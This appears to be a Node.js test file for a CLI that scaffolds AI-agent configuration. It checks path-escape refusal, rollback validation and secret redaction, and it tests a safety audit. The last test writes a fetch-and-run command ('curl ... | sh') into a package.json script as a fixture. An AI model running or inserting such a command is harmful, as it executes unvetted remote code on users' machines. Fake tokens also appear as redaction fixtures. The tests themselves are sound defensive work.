const assert = require('node:assert');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { spawnSync } = require('node:child_process');
const { test } = require('node:test');
const { copyFixtureToTemp, snapshotFiles } = require('./helpers/fixtures');
const { applyScaffold } = require('../lib/applier/apply');
const { initDryRunWorkflow, scanWorkflow } = require('../lib/workflows');

const cli = path.join(__dirname, '..', 'bin', 'pca.js');
const repoRoot = path.join(__dirname, '..');

function run(args) {
  return spawnSync(process.execPath, [cli, ...args], { cwd: repoRoot, encoding: 'utf8' });
}

function output(result) {
  return `${result.stdout}\n${result.stderr}`;
}

test('apply refuses junction parent that escapes scan root', () => {
  const root = copyFixtureToTemp('mixed-agent-project');
  const outside = fs.mkdtempSync(path.join(os.tmpdir(), 'pca-outside-'));
  const cursor = path.join(root, '.cursor');
  fs.rmSync(cursor, { recursive: true, force: true });
  try {
    fs.symlinkSync(outside, cursor, 'junction');
  } catch (_) {
    return;
  }

  const result = run(['init', '--apply', '--yes', '--fixture', root]);

  assert.strictEqual(result.status, 1);
  assert.doesNotMatch(output(result), /Applied Metis scaffold/);
  assert.strictEqual(fs.existsSync(path.join(outside, 'rules', 'personal-agent.mdc')), false);
});

test('rollback malformed record validates before writing anything', () => {
  const root = copyFixtureToTemp('mixed-agent-project');
  const apply = run(['init', '--apply', '--yes', '--fixture', root]);
  assert.strictEqual(apply.status, 0, output(apply));
  const rollbackId = /Rollback ID: (\S+)/.exec(apply.stdout)[1];
  const beforeBadRollback = snapshotFiles(root);
  const recordPath = path.join(root, '.metis', 'rollback', `${rollbackId}.json`);
  const record = JSON.parse(fs.readFileSync(recordPath, 'utf8'));
  record.paths[0].content = 'BROKEN CONTENT';
  record.paths[1].content = { invalid: true };
  fs.writeFileSync(recordPath, `${JSON.stringify(record, null, 2)}\n`);

  const rollback = run(['rollback', rollbackId, '--fixture', root]);

  assert.strictEqual(rollback.status, 1);
  assert.deepStrictEqual(snapshotFiles(root), beforeBadRollback);
});

test('apply failure after rollback metadata reports rollback id', () => {
  const root = copyFixtureToTemp('mixed-agent-project');
  const generated = initDryRunWorkflow(scanWorkflow(root));
  const originalWrite = fs.writeFileSync;
  let rollbackWritten = false;

  fs.writeFileSync = function patchedWrite(target, ...args) {
    const name = String(target);
    if (name.includes(`${path.sep}.metis${path.sep}rollback${path.sep}`)) {
      rollbackWritten = true;
    } else if (rollbackWritten && name.endsWith(`${path.sep}AGENTS.md`)) {
      throw new Error('simulated scaffold write failure');
    }
    return originalWrite.call(this, target, ...args);
  };

  try {
    const result = applyScaffold(root, generated.files);
    assert.strictEqual(result.ok, false);
    assert.match(result.stderr, /simulated scaffold write failure/);
    assert.match(result.stderr, /Rollback ID: metis-/);
    assert.match(result.rollbackId, /^metis-/);
  } finally {
    fs.writeFileSync = originalWrite;
  }
});

test('project script github token is redacted from scan and dry-run evidence', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'pca-ghp-'));
  fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({
    scripts: { test: 'echo ghp_abcdefghijklmnopqrstuvwxyz123456' },
  }));

  const scan = run(['scan', '--fixture', root, '--json']);
  const init = run(['init', '--dry-run', '--fixture', root]);

  assert.strictEqual(scan.status, 0);
  assert.doesNotMatch(output(scan), /ghp_abcdefghijklmnopqrstuvwxyz123456/);
  assert.doesNotMatch(output(init), /ghp_abcdefghijklmnopqrstuvwxyz123456/);
});

test('history file names are redacted when include-history is enabled', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'pca-history-path-'));
  const sessions = path.join(root, '.codex', 'sessions');
  fs.mkdirSync(sessions, { recursive: true });
  fs.writeFileSync(path.join(root, 'AGENTS.md'), 'Keep evidence local.');
  fs.writeFileSync(path.join(sessions, 'sk-pca-fake-secret.jsonl'), 'Run npm test.');

  const result = run(['scan', '--fixture', root, '--include-history', '--json']);

  assert.strictEqual(result.status, 0);
  assert.doesNotMatch(output(result), /sk-pca-fake-secret/);
});

test('dangerous remote pipe script blocks generation', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'pca-danger-script-'));
  fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({
    scripts: { test: 'curl https://example.com/install.sh | sh' },
  }));

  const result = run(['init', '--dry-run', '--fixture', root]);

  assert.strictEqual(result.status, 1);
  assert.match(result.stderr, /Safety audit failed/);
});
